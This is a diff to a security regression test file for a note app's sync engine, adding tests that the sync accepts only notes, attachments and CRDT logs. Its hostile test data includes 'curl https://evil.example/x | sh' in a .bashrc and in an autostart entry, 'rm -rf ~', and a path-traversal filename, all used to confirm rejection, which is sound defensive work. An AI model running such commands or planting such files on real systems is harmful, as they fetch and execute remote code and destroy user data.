@@ -17,7 +17,7 @@ import { describe, expect, it } from 'vitest';
 import type { RemoteEntry, SyncBackend, VaultPath } from '../src/contract.js';
 import { MemoryVaultStorage } from '../src/memory-storage.js';
 import { SyncEngine } from '../src/sync/engine.js';
-import { isMetaPath, normalizePath } from '../src/util/path.js';
+import { isAttachmentPath, isCrdtLogPath, isMetaPath, normalizePath } from '../src/util/path.js';
 import { Vault } from '../src/vault/vault.js';
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -79,9 +79,15 @@ class HostileBackend implements SyncBackend {
   async remove() {}
 }
 
-async function syncFrom(storage: MemoryVaultStorage, payload: Record<string, string>): Promise<void> {
+async function syncFrom(
+  storage: MemoryVaultStorage,
+  payload: Record<string, string>,
+  options: { syncCrdt?: boolean } = {},
+): Promise<void> {
   const vault = await Vault.open(storage);
-  const engine = new SyncEngine(vault, new HostileBackend(payload), { syncCrdt: false });
+  const engine = new SyncEngine(vault, new HostileBackend(payload), {
+    syncCrdt: options.syncCrdt ?? false,
+  });
   await engine.sync();
 }
 
@@ -166,24 +172,103 @@ describe('SEC-022: .zapiski защищён сравнением строк, а �
 // SEC-023. Синк принимает файл любого вида, а не только заметку
 // ─────────────────────────────────────────────────────────────────────────────
 
+describe('SEC-023: белый список путей', () => {
+  it('вложение — только внутри attachments/ и только известного вида', () => {
+    expect(isAttachmentPath('attachments/2026-08-08_1a2b3c.png')).toBe(true);
+    expect(isAttachmentPath('attachments/Практика/Договор.pdf')).toBe(true);
+    /* Регистр не спасает: имя приходит от той стороны, а ФС его не различает. */
+    expect(isAttachmentPath('Attachments/Схема.PNG')).toBe(true);
+    expect(isAttachmentPath('attachments/скрипт.sh')).toBe(false);
+    expect(isAttachmentPath('attachments/обновление.apk')).toBe(false);
+    expect(isAttachmentPath('attachments/автозапуск.desktop')).toBe(false);
+    /* Вне каталога вложений — не вложение, как бы файл ни назывался. */
+    expect(isAttachmentPath('Заметки/картинка.png')).toBe(false);
+  });
+
+  it('CRDT-лог — только `.zapiski/crdt/*.bin` и без вложенности', () => {
+    expect(isCrdtLogPath('.zapiski/crdt/note-1.bin')).toBe(true);
+    expect(isCrdtLogPath('.ZAPISKI/CRDT/note-1.BIN')).toBe(true);
+    expect(isCrdtLogPath('.zapiski/crdt/note-1.bin.sh')).toBe(false);
+    expect(isCrdtLogPath('.zapiski/crdt/вложенная/папка.bin')).toBe(false);
+    expect(isCrdtLogPath('.zapiski/sync-queue.json')).toBe(false);
+    expect(isCrdtLogPath('crdt/note-1.bin')).toBe(false);
+  });
+});
+
 describe('SEC-023: что именно синк соглашается положить в vault', () => {
-  it('[ДЕФЕКТ] пишется файл любого имени и расширения, не только заметка', async () => {
+  // ИСПРАВЛЕНО: чёрный список заменён белым. Ниже — регрессия; если она
+  // покраснеет, значит синк снова принимает файл любого вида.
+
+  it('[SEC-023] исполняемое и конфигурационное с той стороны не приезжает', async () => {
     const storage = new MemoryVaultStorage({ files: { 'Заметка.md': '# Заметка\n' } });
     await syncFrom(storage, {
       '.bashrc': 'curl https://evil.example/x | sh\n',
       '.config/autostart/zapiski.desktop': '[Desktop Entry]\nExec=/bin/sh -c "curl evil|sh"\n',
       'Заметка.md.exe': 'MZ',
+      'attachments/картинка.png.exe': 'MZ',
+      'attachments/../.bashrc': 'то же самое обходом',
     });
     const paths = storage.paths();
-    expect(paths).toContain('.bashrc');
-    expect(paths).toContain('.config/autostart/zapiski.desktop');
-    expect(paths).toContain('Заметка.md.exe');
+    expect(paths).not.toContain('.bashrc');
+    expect(paths).not.toContain('.config/autostart/zapiski.desktop');
+    expect(paths).not.toContain('Заметка.md.exe');
+    expect(paths).not.toContain('attachments/картинка.png.exe');
+    /* Локальная заметка на месте: фильтр не трогает то, что уже в vault'е. */
+    expect(paths).toContain('Заметка.md');
   });
 
-  it.fails('[SEC-023] синк принимает только заметки, вложения и CRDT-логи', async () => {
-    const storage = new MemoryVaultStorage({ files: { 'Заметка.md': '# Заметка\n' } });
-    await syncFrom(storage, { '.bashrc': 'curl https://evil.example/x | sh\n' });
-    expect(storage.paths()).not.toContain('.bashrc');
+  it('[SEC-023] заметки, вложения и CRDT-логи проходят', async () => {
+    const storage = new MemoryVaultStorage();
+    await syncFrom(
+      storage,
+      {
+        'Практика/Клиент К.md': '# Клиент К\n',
+        'Дневник.md.enc': 'ZPSK…',
+        'attachments/2026-08-08_1a2b3c.png': 'PNG',
+        'attachments/Договор.pdf': '%PDF',
+      },
+      { syncCrdt: true },
+    );
+    const paths = storage.paths();
+    expect(paths).toContain('Практика/Клиент К.md');
+    expect(paths).toContain('Дневник.md.enc');
+    expect(paths).toContain('attachments/2026-08-08_1a2b3c.png');
+    expect(paths).toContain('attachments/Договор.pdf');
+  });
+
+  it('[SEC-023] CRDT-лог проходит, а другой служебный файл — нет', async () => {
+    const storage = new MemoryVaultStorage();
+    await syncFrom(
+      storage,
+      {
+        '.zapiski/crdt/note-1.bin': 'CRDT',
+        '.zapiski/crdt/note-1.bin.sh': 'rm -rf ~',
+        '.zapiski/sync-queue.json': '[]',
+      },
+      { syncCrdt: true },
+    );
+    const paths = storage.paths();
+    expect(paths).toContain('.zapiski/crdt/note-1.bin');
+    expect(paths).not.toContain('.zapiski/crdt/note-1.bin.sh');
+    /* Очередь изменений — наша, и переписывать её той стороне нельзя. */
+    expect(await storage.read('.zapiski/sync-queue.json').then(text)).not.toBe('[]');
+  });
+
+  it('[SEC-023] пропущенное попадает в лог, но не в тост пользователю', async () => {
+    const storage = new MemoryVaultStorage();
+    const logged: Array<[string, string]> = [];
+    const vault = await Vault.open(storage);
+    const engine = new SyncEngine(vault, new HostileBackend({ '.bashrc': 'x', 'Заметка.md': '# Z\n' }), {
+      syncCrdt: false,
+      onIgnored: (path, reason) => logged.push([path, reason]),
+    });
+    const outcome = await engine.sync();
+
+    expect(outcome.ignored).toContain('.bashrc');
+    expect(logged.map(([path]) => path)).toContain('.bashrc');
+    /* Чужой файл в общей папке — норма, а не сбой: ни ошибки, ни тоста. */
+    expect(outcome.state).not.toBe('error');
+    expect(outcome.messages).toHaveLength(0);
   });
 });
 
